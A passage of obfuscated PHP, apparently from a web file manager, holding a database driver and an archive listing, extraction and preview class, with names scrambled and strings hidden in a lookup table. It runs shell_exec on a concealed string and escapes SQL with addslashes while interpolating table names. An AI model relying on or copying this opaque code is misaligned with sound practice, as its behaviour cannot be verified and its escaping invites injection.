"\123\x45\114\105\103\x54\x20\40\x20\x63\x6f\x6c\165\x6d\156\x5f\x6e\x61\x6d\x65\x20\141\x73\40\47\x4e\141\155\x65\x27\x2c\40\40\x20\x64\x61\164\x61\x5f\x74\x79\160\x65\40\x61\x73\40\47\124\x79\x70\x65\x27\54\40\x20\40\143\157\154\165\x6d\x6e\137\x64\145\x66\x61\x75\154\164\x20\x61\x73\40\x27\104\145\x66\141\165\154\x74\47\x2c\40\40\x20\x69\x73\x5f\x6e\165\x6c\154\x61\x62\154\145\40\141\x73\x20\47\x4e\x75\154\154\47\12\x9\x9\106\122\x4f\x4d\11\151\156\146\x6f\x72\x6d\x61\x74\151\157\156\137\163\143\150\x65\x6d\141\56\x74\141\142\154\x65\163\x20\101\123\40\164\12\x9\x9\x4a\x4f\111\x4e\x9\151\x6e\146\157\162\x6d\x61\164\151\x6f\156\x5f\x73\143\x68\x65\x6d\x61\56\x63\157\154\x75\155\x6e\163\40\x41\x53\x20\x63\xa\11\x9\x4f\x4e\40\40\164\x2e\x74\141\x62\x6c\145\137\143\x61\x74\x61\154\x6f\147\40\75\40\x63\x2e\x74\141\x62\x6c\145\x5f\143\x61\x74\141\x6c\x6f\x67\12\x9\x9\x41\x4e\x44\40\164\x2e\x74\141\x62\154\x65\x5f\x73\x63\x68\x65\155\141\40\75\x20\143\x2e\164\141\142\154\x65\x5f\163\143\x68\145\155\141\12\x9\11\101\x4e\x44\x20\164\x2e\x74\141\x62\154\145\137\x6e\141\x6d\145\x20\x3d\40\143\x2e\x74\141\142\154\145\137\156\x61\155\145\xa\11\11\x57\110\105\122\105\x20\40\40\x74\56\x74\x61\142\154\x65\137\x6e\141\x6d\x65\40\75\x20\47{$fÔÉ—Ú¾èƒ}\x27"; break; case $C¥ç‘Åœ’[851]: $EÕ¦‹šØì‡ = $C¥ç‘Åœ’[852] . $fÔÉ—Ú¾èƒ . $C¥ç‘Åœ’[853]; break; case $C¥ç‘Åœ’[833]: case $C¥ç‘Åœ’[835]: $EÕ¦‹šØì‡ = $C¥ç‘Åœ’[854] . $C¥ç‘Åœ’[855] . $C¥ç‘Åœ’[856] . strtoupper($fÔÉ—Ú¾èƒ) . $C¥ç‘Åœ’[857] . strtoupper($fÔÉ—Ú¾èƒ) . $C¥ç‘Åœ’[858]; break; case $C¥ç‘Åœ’[859]: $EÕ¦‹šØì‡ = $C¥ç‘Åœ’[860] . $fÔÉ—Ú¾èƒ . $C¥ç‘Åœ’[861]; break; case $C¥ç‘Åœ’[834]: break; case $C¥ç‘Åœ’[862]: default: $EÕ¦‹šØì‡ = $C¥ç‘Åœ’[863] . ($this->dbType == $C¥ç‘Åœ’[862] ? "\x60{$fÔÉ—Ú¾èƒ}\140" : $fÔÉ—Ú¾èƒ); } } goto a¹ÒºÒÄë; a¹ÒºÒÄë: $bÌŒŠ¼– = $this->query($EÕ¦‹šØì‡); $EÏ’Ôƒ…Ù = array(); if ($bÌŒŠ¼–) { foreach ($bÌŒŠ¼– as $f¤Ã©Ô“½ƒ => $eæƒ•‘½¤Ø) { $eæƒ•‘½¤Ø = array_change_key_case($eæƒ•‘½¤Ø); $eæƒ•‘½¤Ø[$C¥ç‘Åœ’[28]] = isset($eæƒ•‘½¤Ø[$C¥ç‘Åœ’[28]]) ? $eæƒ•‘½¤Ø[$C¥ç‘Åœ’[28]] : $C¥ç‘Åœ’[361]; $eæƒ•‘½¤Ø[$C¥ç‘Åœ’[29]] = isset($eæƒ•‘½¤Ø[$C¥ç‘Åœ’[29]]) ? $eæƒ•‘½¤Ø[$C¥ç‘Åœ’[29]] : $C¥ç‘Åœ’[361]; $dóÎ·ª­ğ = isset($eæƒ•‘½¤Ø[$C¥ç‘Åœ’[261]]) ? $eæƒ•‘½¤Ø[$C¥ç‘Åœ’[261]] : $eæƒ•‘½¤Ø[$C¥ç‘Åœ’[28]]; $EÏ’Ôƒ…Ù[$dóÎ·ª­ğ] = array($C¥ç‘Åœ’[28] => $dóÎ·ª­ğ, $C¥ç‘Åœ’[29] => $eæƒ•‘½¤Ø[$C¥ç‘Åœ’[29]], $C¥ç‘Åœ’[31] => (bool) (isset($eæƒ•‘½¤Ø[$C¥ç‘Åœ’[99]]) && $eæƒ•‘½¤Ø[$C¥ç‘Åœ’[99]] === $C¥ç‘Åœ’[33] || isset($eæƒ•‘½¤Ø[$C¥ç‘Åœ’[31]]) && $eæƒ•‘½¤Ø[$C¥ç‘Åœ’[31]] === $C¥ç‘Åœ’[33]), $C¥ç‘Åœ’[34] => isset($eæƒ•‘½¤Ø[$C¥ç‘Åœ’[34]]) ? $eæƒ•‘½¤Ø[$C¥ç‘Åœ’[34]] : (isset($eæƒ•‘½¤Ø[$C¥ç‘Åœ’[53]]) ? $eæƒ•‘½¤Ø[$C¥ç‘Åœ’[53]] : $C¥ç‘Åœ’[361]), $C¥ç‘Åœ’[36] => isset($eæƒ•‘½¤Ø[$C¥ç‘Åœ’[89]]) ? strtolower($eæƒ•‘½¤Ø[$C¥ç‘Åœ’[89]]) == $C¥ç‘Åœ’[38] : (isset($eæƒ•‘½¤Ø[$C¥ç‘Åœ’[54]]) ? $eæƒ•‘½¤Ø[$C¥ç‘Åœ’[54]] : !1), $C¥ç‘Åœ’[39] => isset($eæƒ•‘½¤Ø[$C¥ç‘Åœ’[864]]) ? strtolower($eæƒ•‘½¤Ø[$C¥ç‘Åœ’[864]]) == $C¥ç‘Åœ’[41] : (isset($eæƒ•‘½¤Ø[$C¥ç‘Åœ’[89]]) ? $eæƒ•‘½¤Ø[$C¥ç‘Åœ’[89]] : !1)); } } goto C§Ï˜¾‰ï; eª›®ÚÕ°¾: } public function getTables($Aø˜š÷ƒâ… = '') { $eÕÇ»×Œùº =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (think_config($eÕÇ»×Œùº[865])) { $aÎË–çŞòÌ = str_replace($eÕÇ»×Œùº[866], $Aø˜š÷ƒâ…, think_config($eÕÇ»×Œùº[865])); } else { switch ($this->dbType) { case $eÕÇ»×Œùº[833]: case $eÕÇ»×Œùº[835]: $aÎË–çŞòÌ = $eÕÇ»×Œùº[867]; break; case $eÕÇ»×Œùº[832]: case $eÕÇ»×Œùº[850]: $aÎË–çŞòÌ = $eÕÇ»×Œùº[868]; break; case $eÕÇ»×Œùº[859]: $aÎË–çŞòÌ = $eÕÇ»×Œùº[869]; break; case $eÕÇ»×Œùº[834]: think_exception(think_lang($eÕÇ»×Œùº[870]) . $eÕÇ»×Œùº[871]); break; case $eÕÇ»×Œùº[851]: $aÎË–çŞòÌ = $eÕÇ»×Œùº[42] . $eÕÇ»×Œùº[43] . $eÕÇ»×Œùº[44]; break; case $eÕÇ»×Œùº[862]: default: if (!empty($Aø˜š÷ƒâ…)) { $aÎË–çŞòÌ = $eÕÇ»×Œùº[815] . $Aø˜š÷ƒâ…; } else { $aÎË–çŞòÌ = $eÕÇ»×Œùº[816]; } } } $Dí¸¸Ğ•¿‚ = $this->query($aÎË–çŞòÌ); $F’†ÉË¢œ³ = array(); foreach ($Dí¸¸Ğ•¿‚ as $fï…®Ú„Å => $c´Íêƒğò) { $F’†ÉË¢œ³[$fï…®Ú„Å] = current($c´Íêƒğò); } return $F’†ÉË¢œ³; } protected function parseLimit($d°ñ½ÓËß) { $a¹Ğ‡İ‡‚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AÂøÑæŠ¿ = $a¹Ğ‡İ‡‚[33]; if (!empty($d°ñ½ÓËß)) { switch ($this->dbType) { case $a¹Ğ‡İ‡‚[859]: case $a¹Ğ‡İ‡‚[851]: $d°ñ½ÓËß = explode($a¹Ğ‡İ‡‚[47], $d°ñ½ÓËß); if (count($d°ñ½ÓËß) > 1) { $AÂøÑæŠ¿ .= $a¹Ğ‡İ‡‚[48] . $d°ñ½ÓËß[1] . $a¹Ğ‡İ‡‚[49] . $d°ñ½ÓËß[0] . $a¹Ğ‡İ‡‚[50]; } else { $AÂøÑæŠ¿ .= $a¹Ğ‡İ‡‚[48] . $d°ñ½ÓËß[0] . $a¹Ğ‡İ‡‚[50]; } break; case $a¹Ğ‡İ‡‚[832]: case $a¹Ğ‡İ‡‚[850]: break; case $a¹Ğ‡İ‡‚[834]: break; case $a¹Ğ‡İ‡‚[833]: case $a¹Ğ‡İ‡‚[835]: break; case $a¹Ğ‡İ‡‚[862]: default: $AÂøÑæŠ¿ .= $a¹Ğ‡İ‡‚[48] . $d°ñ½ÓËß . $a¹Ğ‡İ‡‚[50]; } } return $AÂøÑæŠ¿; } public function parseKey(&$dÄÙ»ÊÁİ‘, $FÙ½òîª´ = true) { $C±£—Õù¿Â =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($FÙ½òîª´) { $dÄÙ»ÊÁİ‘ = $this->parseKeyCheck($dÄÙ»ÊÁİ‘); } if ($this->dbType == $C±£—Õù¿Â[862]) { if ($dÄÙ»ÊÁİ‘ != $C±£—Õù¿Â[176] && !preg_match($C±£—Õù¿Â[826], $dÄÙ»ÊÁİ‘)) { $dÄÙ»ÊÁİ‘ = $C±£—Õù¿Â[827] . trim($dÄÙ»ÊÁİ‘, $C±£—Õù¿Â[827]) . $C±£—Õù¿Â[827]; } return $dÄÙ»ÊÁİ‘; } else { return parent::parseKey($dÄÙ»ÊÁİ‘); } } public function close() { $this->_linkID = null; } public function error() { $dôôºÌŠœ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($this->PDOStatement) { $C¬ñÀ¸§†ˆ = $this->PDOStatement->errorInfo(); $this->error = $C¬ñÀ¸§†ˆ[1] . $dôôºÌŠœ[4] . $C¬ñÀ¸§†ˆ[2]; } else { $this->error = $dôôºÌŠœ[33]; } if ($dôôºÌŠœ[33] != $this->queryStr) { $this->error .= LNG($dôôºÌŠœ[45]) . $this->queryStr; } think_trace($this->error, $dôôºÌŠœ[33], $dôôºÌŠœ[46]); return $this->error; } public function escapeString($C¥ĞôÌ·¬Õ) { $a„÷ î©Ìè =& $_SERVER[´Ù×Íå‘ÄõÛ]; switch ($this->dbType) { case $a„÷ î©Ìè[859]: case $a„÷ î©Ìè[832]: case $a„÷ î©Ìè[850]: case $a„÷ î©Ìè[862]: return addslashes($C¥ĞôÌ·¬Õ); case $a„÷ î©Ìè[834]: case $a„÷ î©Ìè[851]: case $a„÷ î©Ìè[833]: case $a„÷ î©Ìè[835]: return str_ireplace($a„÷ î©Ìè[55], $a„÷ î©Ìè[56], $C¥ĞôÌ·¬Õ); } } protected function parseValue($Båõè‚Â£ˆ) { $EÍ’ë±Ş›í =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (is_string($Båõè‚Â£ˆ)) { $Båõè‚Â£ˆ = strpos($Båõè‚Â£ˆ, $EÍ’ë±Ş›í[4]) === 0 ? $this->escapeString($Båõè‚Â£ˆ) : $EÍ’ë±Ş›í[872] . $this->escapeString($Båõè‚Â£ˆ) . $EÍ’ë±Ş›í[872]; } elseif (isset($Båõè‚Â£ˆ[0]) && is_string($Båõè‚Â£ˆ[0]) && strtolower($Båõè‚Â£ˆ[0]) == $EÍ’ë±Ş›í[285]) { $Båõè‚Â£ˆ = $this->escapeString($Båõè‚Â£ˆ[1]); } elseif (is_array($Båõè‚Â£ˆ)) { $Båõè‚Â£ˆ = array_map(array($this, $EÍ’ë±Ş›í[873]), $Båõè‚Â£ˆ); } elseif (is_bool($Båõè‚Â£ˆ)) { $Båõè‚Â£ˆ = $Båõè‚Â£ˆ ? $EÍ’ë±Ş›í[83] : $EÍ’ë±Ş›í[470]; } elseif (is_null($Båõè‚Â£ˆ)) { $Båõè‚Â£ˆ = $EÍ’ë±Ş›í[99]; } return $Båõè‚Â£ˆ; } public function getLastInsertId() { $Fì¼õÔÀ =& $_SERVER[´Ù×Íå‘ÄõÛ]; switch ($this->dbType) { case $Fì¼õÔÀ[859]: case $Fì¼õÔÀ[851]: case $Fì¼õÔÀ[832]: case $Fì¼õÔÀ[850]: case $Fì¼õÔÀ[834]: case $Fì¼õÔÀ[862]: return $this->_linkID->lastInsertId(); case $Fì¼õÔÀ[833]: case $Fì¼õÔÀ[835]: $fÖµ•ÊÏØ = $this->table; $bŠ’¦ÔÀœˆ = $this->query("\x53\105\x4c\x45\103\x54\40{$fÖµ•ÊÏØ}\56\x63\165\162\162\166\141\x6c\40\x63\x75\162\162\166\141\x6c\40\x46\122\117\115\x20\x64\x75\x61\x6c"); return $bŠ’¦ÔÀœˆ ? $bŠ’¦ÔÀœˆ[0][$Fì¼õÔÀ[874]] : 0; } } } goto EµÃ·Œ°öÏ; FåÜØÇ°: class KodArchive { static function init() { goto eƒ××£éŸ; EššÕÔÑ³ª: require_once ARCHIVE_LIB . $CÉîˆ’³ÅÅ[1904]; goto cä®Ìé¾­í; aº§˜¡Œ°Ú: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $CÉîˆ’³ÅÅ[1899]; require_once ARCHIVE_LIB . $CÉîˆ’³ÅÅ[1900]; goto DÇÛÀó‡Ïâ; DÇÛÀó‡Ïâ: require_once ARCHIVE_LIB . $CÉîˆ’³ÅÅ[1901]; require_once ARCHIVE_LIB . $CÉîˆ’³ÅÅ[1902]; require_once ARCHIVE_LIB . $CÉîˆ’³ÅÅ[1903]; goto EššÕÔÑ³ª; eƒ××£éŸ: $CÉîˆ’³ÅÅ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (defined($CÉîˆ’³ÅÅ[1893])) { return; } define($CÉîˆ’³ÅÅ[1893], SDK_DIR . $CÉîˆ’³ÅÅ[1894]); goto càİ§®ºÈ; càİ§®ºÈ: define($CÉîˆ’³ÅÅ[1895], TEMP_FILES); define($CÉîˆ’³ÅÅ[1896], TEMP_FILES); define($CÉîˆ’³ÅÅ[1897], $CÉîˆ’³ÅÅ[1898]); goto aº§˜¡Œ°Ú; cä®Ìé¾­í: } static function checkIfType($Aèèˆ‹òõè, $C·ÌÎ‘ÇŒ) { goto A«ßò‰ƒ‡Â; Dº›Øœ¢ä¨: $fô–âØîÇ‡ = in_array($Aèèˆ‹òõè, $E‡Ÿù‹’«ó[$C·ÌÎ‘ÇŒ]); if ($fô–âØîÇ‡ && ($C·ÌÎ‘ÇŒ == $EòŸÀ¨ÚÜİ[301] || $C·ÌÎ‘ÇŒ == $EòŸÀ¨ÚÜİ[1908]) && (!function_exists($EòŸÀ¨ÚÜİ[1916]) || !function_exists($EòŸÀ¨ÚÜİ[1917]))) { show_tips($EòŸÀ¨ÚÜİ[1918]); } if ($fô–âØîÇ‡ && $C·ÌÎ‘ÇŒ == $EòŸÀ¨ÚÜİ[1049] && (!function_exists($EòŸÀ¨ÚÜİ[1919]) || !strstr(shell_exec($EòŸÀ¨ÚÜİ[1920]), $EòŸÀ¨ÚÜİ[1921]))) { show_tips($EòŸÀ¨ÚÜİ[1922]); } goto D¸óÄ—Š÷; D¸óÄ—Š÷: return $fô–âØîÇ‡; goto dÒÄå‹ôÃ—; A«ßò‰ƒ‡Â: $EòŸÀ¨ÚÜİ =& $_SERVER[´Ù×Íå‘ÄõÛ]; self::init(); $E‡Ÿù‹’«ó = array($EòŸÀ¨ÚÜİ[301] => array($EòŸÀ¨ÚÜİ[301], $EòŸÀ¨ÚÜİ[1905], $EòŸÀ¨ÚÜİ[1906], $EòŸÀ¨ÚÜİ[1907]), $EòŸÀ¨ÚÜİ[1908] => array($EòŸÀ¨ÚÜİ[1908], $EòŸÀ¨ÚÜİ[1909], $EòŸÀ¨ÚÜİ[1047], $EòŸÀ¨ÚÜİ[1045]), $EòŸÀ¨ÚÜİ[1049] => array($EòŸÀ¨ÚÜİ[1049], $EòŸÀ¨ÚÜİ[1910], $EòŸÀ¨ÚÜİ[1911], $EòŸÀ¨ÚÜİ[1912], $EòŸÀ¨ÚÜİ[1913], $EòŸÀ¨ÚÜİ[1914], $EòŸÀ¨ÚÜİ[1915])); goto Dº›Øœ¢ä¨; dÒÄå‹ôÃ—: } static function listContent($eÎøÅ‹ÄÔæ, $A°ôÉñ‰˜Á = true) { $Aøéî‘Ì =& $_SERVER[´Ù×Íå‘ÄõÛ]; self::init(); $AÈ¿Õ§ƒ¤ª = !empty($GLOBALS[$Aøéî‘Ì[1053]]) ? $GLOBALS[$Aøéî‘Ì[1053]] : get_path_ext($eÎøÅ‹ÄÔæ); $fó†âšÌÓ = !1; if (self::checkIfType($AÈ¿Õ§ƒ¤ª, $Aøéî‘Ì[1908])) { $AÁ‰¤†Òâ¾ = PclTarList($eÎøÅ‹ÄÔæ, $AÈ¿Õ§ƒ¤ª); $fó†âšÌÓ = array(); for ($d·ëìõÀÕ = 0; $d·ëìõÀÕ < count($AÁ‰¤†Òâ¾); $d·ëìõÀÕ++) { $C¿®Ø“ÁŠ = $AÁ‰¤†Òâ¾[$d·ëìõÀÕ]; if ($C¿®Ø“ÁŠ[$Aøéî‘Ì[1923]] == $Aøéî‘Ì[1924] || $C¿®Ø“ÁŠ[$Aøéî‘Ì[1923]] == $Aøéî‘Ì[1925]) { continue; } if ($A°ôÉñ‰˜Á) { $C¿®Ø“ÁŠ[$Aøéî‘Ì[1926]] = ltrim($C¿®Ø“ÁŠ[$Aøéî‘Ì[1926]], $Aøéî‘Ì[1159]); } if ($C¿®Ø“ÁŠ[$Aøéî‘Ì[1923]] == $Aøéî‘Ì[1927]) { $C¿®Ø“ÁŠ[$Aøéî‘Ì[76]] = !0; } else { $C¿®Ø“ÁŠ[$Aøéî‘Ì[76]] = !1; } $C¿®Ø“ÁŠ[$Aøéî‘Ì[1040]] = $d·ëìõÀÕ; $fó†âšÌÓ[] = $C¿®Ø“ÁŠ; } } else { if (self::checkIfType($AÈ¿Õ§ƒ¤ª, $Aøéî‘Ì[1049])) { $fåÇÄš…« = kodRarArchive::listContent($eÎøÅ‹ÄÔæ); if (!$fåÇÄš…«[$Aøéî‘Ì[1036]]) { return $fåÇÄš…«; } else { $fó†âšÌÓ = $fåÇÄš…«[$Aøéî‘Ì[1038]]; } } else { if (kodZipArchive::support($Aøéî‘Ì[354])) { $fó†âšÌÓ = kodZipArchive::listContent($eÎøÅ‹ÄÔæ); } else { $f¤‹í†õß´ = new PclZip($eÎøÅ‹ÄÔæ); $fó†âšÌÓ = $f¤‹í†õß´->listContent(); } } } if ($fó†âšÌÓ) { $fÄ„‘«ˆ¶À = unzip_charset_get($fó†âšÌÓ); $A°ôÉñ‰˜Á = $A°ôÉñ‰˜Á && function_exists($Aøéî‘Ì[65]); for ($d·ëìõÀÕ = 0; $d·ëìõÀÕ < count($fó†âšÌÓ); $d·ëìõÀÕ++) { $fó†âšÌÓ[$d·ëìõÀÕ][$Aøéî‘Ì[1926]] = str_replace(array($Aøéî‘Ì[1076], $Aøéî‘Ì[1928]), $Aøéî‘Ì[764], $fó†âšÌÓ[$d·ëìõÀÕ][$Aøéî‘Ì[1926]]); if ($A°ôÉñ‰˜Á) { $fó†âšÌÓ[$d·ëìõÀÕ][$Aøéî‘Ì[1926]] = iconv_to($fó†âšÌÓ[$d·ëìõÀÕ][$Aøéî‘Ì[1926]], $fÄ„‘«ˆ¶À, $Aøéî‘Ì[326]); unset($fó†âšÌÓ[$d·ëìõÀÕ][$Aøéî‘Ì[1929]]); } } return array($Aøéî‘Ì[1036] => !0, $Aøéî‘Ì[1038] => $fó†âšÌÓ); } else { return array($Aøéî‘Ì[1036] => !1, $Aøéî‘Ì[1038] => $fó†âšÌÓ); } } static function extract($cêŒ¥­ÚŠƒ, $e­ºóæŠ˜·, $C¤—„”‹£Ò = "\55\61", &$eº‡æòİÈ× = false) { goto e»³¥“ˆ—£; fÌ‡ÎíĞ»½: if (self::checkIfType($B…éİÑ·Î, $b´ø­ÙÂ[1908])) { if ($C¤—„”‹£Ò != $b´ø­ÙÂ[1035]) { $c˜Û¡æÁÈ = unzip_pre_name($c˜Û¡æÁÈ); $AÖ«çƒÑí„ = unzip_pre_name($AÖ«çƒÑí„); $Aã÷ “âÁÓ = PclTarExtractList($cêŒ¥­ÚŠƒ, array($c˜Û¡æÁÈ), $e­ºóæŠ˜·, $AÖ«çƒÑí„, $B…éİÑ·Î); } else { $Aã÷ “âÁÓ = PclTarExtract($cêŒ¥­ÚŠƒ, $e­ºóæŠ˜·, $b´ø­ÙÂ[361], $B…éİÑ·Î); } return array($b´ø­ÙÂ[1036] => $Aã÷ “âÁÓ, $b´ø­ÙÂ[1038] => PclErrorString(!0)); } else { if (self::checkIfType($B…éİÑ·Î, $b´ø­ÙÂ[1049])) { return kodRarArchive::extract($cêŒ¥­ÚŠƒ, $e­ºóæŠ˜·, $B…éİÑ·Î, $eº‡æòİÈ×); } else { if (kodZipArchive::support($b´ø­ÙÂ[1930])) { return kodZipArchive::extract($cêŒ¥­ÚŠƒ, $e­ºóæŠ˜·, $eº‡æòİÈ×); } else { $e¦ÜğˆèŸ = new PclZip($cêŒ¥­ÚŠƒ); if ($C¤—„”‹£Ò != $b´ø­ÙÂ[1035]) { $Aã÷ “âÁÓ = $e¦ÜğˆèŸ->extract(PCLZIP_OPT_PATH, $e­ºóæŠ˜·, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $b´ø­ÙÂ[1931], PCLZIP_OPT_BY_NAME, $dñÁíÃó²ê[$b´ø­ÙÂ[1926]], PCLZIP_OPT_REMOVE_PATH, $AÖ«çƒÑí„, PCLZIP_OPT_REPLACE_NEWER); } else { $Aã÷ “âÁÓ = $e¦ÜğˆèŸ->extract(PCLZIP_OPT_PATH, $e­ºóæŠ˜·, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $b´ø­ÙÂ[1931], PCLZIP_OPT_REPLACE_NEWER); } return array($b´ø­ÙÂ[1036] => $Aã÷ “âÁÓ, $b´ø­ÙÂ[1038] => $e¦ÜğˆèŸ->errorName(!0)); } } } return array($b´ø­ÙÂ[1036] => !1, $b´ø­ÙÂ[1038] => $b´ø­ÙÂ[1932]); goto dÀÃğ¶ö•; dí‰™¡‹´¯: $D¼«¸§§†à = self::listContent($cêŒ¥­ÚŠƒ, !1); if (!$D¼«¸§§†à[$b´ø­ÙÂ[1036]]) { return $D¼«¸§§†à; } if ($C¤—„”‹£Ò != $b´ø­ÙÂ[1035]) { goto Fº‚ï¿š«; Fº‚ï¿š«: $dñÁíÃó²ê = self::fileIndex($D¼«¸§§†à[$b´ø­ÙÂ[1038]], $C¤—„”‹£Ò); $eº‡æòİÈ× = str_replace(array($b´ø­ÙÂ[1076], $b´ø­ÙÂ[1928]), $b´ø­ÙÂ[70], $dñÁíÃó²ê[$b´ø­ÙÂ[1926]]); $c˜Û¡æÁÈ = $eº‡æòİÈ×; goto d“ë•“Ÿ„; d“ë•“Ÿ„: if ($GLOBALS[$b´ø­ÙÂ[6]][$b´ø­ÙÂ[1157]] != $b´ø­ÙÂ[326]) { $c˜Û¡æÁÈ = unzip_pre_name($eº‡æòİÈ×); } $AÖ«çƒÑí„ = get_path_father($eº‡æòİÈ×); if ($AÖ«çƒÑí„ == $eº‡æòİÈ×) { $AÖ«çƒÑí„ = $b´ø­ÙÂ[33]; } goto C¥ÊëßŠÍ; C¥ÊëßŠÍ: if ($dñÁíÃó²ê[$b´ø­ÙÂ[76]]) { $c˜Û¡æÁÈ = rtrim($c˜Û¡æÁÈ, $b´ø­ÙÂ[8]) . $b´ø­ÙÂ[8]; $eº‡æòİÈ× = array($eº‡æòİÈ×); } $c’Üã¾ÉÅé = str_replace($b´ø­ÙÂ[93], $b´ø­ÙÂ[8], $c˜Û¡æÁÈ); if (substr($c’Üã¾ÉÅé, -1) == $b´ø­ÙÂ[8]) { if (!strstr(trim($c’Üã¾ÉÅé, $b´ø­ÙÂ[8]), $b´ø­ÙÂ[8])) { $e­ºóæŠ˜· = $e­ºóæŠ˜· . get_path_this($c’Üã¾ÉÅé) . $b´ø­ÙÂ[8]; } } else { if ($AÖ«çƒÑí„ == $c˜Û¡æÁÈ) { $AÖ«çƒÑí„ = $b´ø­ÙÂ[33]; } } goto D ¡òŞˆ‘°; D ¡òŞˆ‘°: } goto fÌ‡ÎíĞ»½; e»³¥“ˆ—£: $b´ø­ÙÂ =& $_SERVER[´Ù×Íå‘ÄõÛ]; self::init(); $B…éİÑ·Î = !empty($GLOBALS[$b´ø­ÙÂ[1053]]) ? $GLOBALS[$b´ø­ÙÂ[1053]] : get_path_ext($cêŒ¥­ÚŠƒ); goto dí‰™¡‹´¯; dÀÃğ¶ö•: } static function fileIndex($B°İ±†÷™³, $d¹‘‹ƒ´à…, $BñÚÒ³ÍĞ£ = false) { goto Cø°òƒ’Áˆ; Cø°òƒ’Áˆ: $eÂ»Š ‰Øï =& $_SERVER[´Ù×Íå‘ÄõÛ]; self::init(); if (!is_array($B°İ±†÷™³)) { return !1; } goto C«È…¸Ğø; AÜƒö¶Ñè™: $dîòÌ£èÈ” = $bß¶’‡ä›ù; if ($BñÚÒ³ÍĞ£) { $dîòÌ£èÈ” = $bß¶’‡ä›ù[$BñÚÒ³ÍĞ£]; if ($bß¶’‡ä›ù[$eÂ»Š ‰Øï[76]]) { $dîòÌ£èÈ” = rtrim($dîòÌ£èÈ”, $eÂ»Š ‰Øï[8]) . $eÂ»Š ‰Øï[8]; } } return $dîòÌ£èÈ”; goto Dì¤½Â°¾; C«È…¸Ğø: $F’š•îšÀê = count($B°İ±†÷™³); for ($Döó¡´÷‘ˆ = 0; $Döó¡´÷‘ˆ < $F’š•îšÀê; $Döó¡´÷‘ˆ++) { if ($d¹‘‹ƒ´à… == $B°İ±†÷™³[$Döó¡´÷‘ˆ][$eÂ»Š ‰Øï[1040]]) { $bß¶’‡ä›ù = $B°İ±†÷™³[$Döó¡´÷‘ˆ]; break; } } if (!$bß¶’‡ä›ù) { show_tips($eÂ»Š ‰Øï[1933]); } goto AÜƒö¶Ñè™; Dì¤½Â°¾: } static function extractZipFile($B±ÕÀ™ìê¬, $fÄ´­¨ÅĞ, $D•ô¡…çï¶ = false) { goto cˆêÎ†ÇÇ; D¢”ÒøËßŒ: if (file_exists($FÛĞ´…ò·ñ)) { return $FÛĞ´…ò·ñ; } $EİóÎ£Öéî = new PclZip($B±ÕÀ™ìê¬); $a”‹¹ßè = unzip_filter_ext($e¤Áé¸ ‘Ø . get_path_this($fÄ´­¨ÅĞ)); goto AÂù…ŒøØ; AÂù…ŒøØ: $b•¢ö¸Îœ± = get_path_father($fÄ´­¨ÅĞ); if ($b•¢ö¸Îœ± == $fÄ´­¨ÅĞ) { $b•¢ö¸Îœ± = $DˆÍÅ¢İÑ[33]; } $cİ¾£¾“‡Ç = $EİóÎ£Öéî->extract(PCLZIP_OPT_PATH, $e¤Áé¸ ‘Ø, PCLZIP_CB_PRE_FILE_NAME, $DˆÍÅ¢İÑ[1931], PCLZIP_OPT_REMOVE_PATH, $b•¢ö¸Îœ±, PCLZIP_OPT_BY_NAME, $fÄ´­¨ÅĞ); goto Bè»¾‘©Ù; cˆêÎ†ÇÇ: $DˆÍÅ¢İÑ =& $_SERVER[´Ù×Íå‘ÄõÛ]; self::init(); $e¤Áé¸ ‘Ø = TEMP_FILES . hash_path($B±ÕÀ™ìê¬) . $DˆÍÅ¢İÑ[8]; goto B¸Š×Ó”; Bè»¾‘©Ù: if (!file_exists($a”‹¹ßè)) { return !1; } @rename($a”‹¹ßè, $FÛĞ´…ò·ñ); return $FÛĞ´…ò·ñ; goto dÓŞ¿ĞÖÍ‹; B¸Š×Ó”: mk_dir($e¤Áé¸ ‘Ø); $FÛĞ´…ò·ñ = $e¤Áé¸ ‘Ø . md5($B±ÕÀ™ìê¬ . $fÄ´­¨ÅĞ); if ($D•ô¡…çï¶) { $FÛĞ´…ò·ñ = $e¤Áé¸ ‘Ø . $D•ô¡…çï¶; } goto D¢”ÒøËßŒ; dÓŞ¿ĞÖÍ‹: } static function filePreview($AãŒ¥…»´›, $B²Ê…ÆË”, $F½ùŸÓ˜£‚ = false, $dšù’½ Œğ = false) { goto a¿÷ÆÖÏ‡†; e „ñÅç“: $A¸Ä¯î§Ì¯ = self::extract($AãŒ¥…»´›, $f·İÂ‹ÉŠ, $B²Ê…ÆË”, $A×¦„Äòˆ×); if (is_array($A×¦„Äòˆ×)) { show_json($Eâì©ß[1934], !1); } if (file_exists($E™“µ‹›)) { IO::fileOut($E™“µ‹›, $F½ùŸÓ˜£‚, get_path_this($A×¦„Äòˆ×)); return; } goto f²ø†Š¶‚‡; f²ø†Š¶‚‡: $A×¦„Äòˆ× = unzip_pre_name($A×¦„Äòˆ×); $EÁìƒ¤¿òÔ = get_path_this($A×¦„Äòˆ×); $CÂ•«¶ÇÉº = unzip_filter_ext($f·İÂ‹ÉŠ . $EÁìƒ¤¿òÔ); goto D“£Üˆ††Ù; B‘õ¢ÚïŸ§: if (!file_exists($E™“µ‹›)) { del_dir($f·İÂ‹ÉŠ); show_json($Eâì©ß[1936]); } IO::fileOut($E™“µ‹›, $F½ùŸÓ˜£‚, $EÁìƒ¤¿òÔ); goto aÎù±ëø™£; D…„ßÇæƒô: mk_dir($f·İÂ‹ÉŠ); $E™“µ‹› = $f·İÂ‹ÉŠ . md5($AãŒ¥…»´› . $B²Ê…ÆË” . $dšù’½ Œğ); $A×¦„Äòˆ× = $Eâì©ß[33]; goto e „ñÅç“; a¿÷ÆÖÏ‡†: $Eâì©ß =& $_SERVER[´Ù×Íå‘ÄõÛ]; self::init(); $f·İÂ‹ÉŠ = TEMP_FILES . hash_path($AãŒ¥…»´›) . $Eâì©ß[8]; goto D…„ßÇæƒô; D“£Üˆ††Ù: if (!$A¸Ä¯î§Ì¯[$Eâì©ß[1036]]) { show_json($A¸Ä¯î§Ì¯[$Eâì©ß[1038]], !1); } if 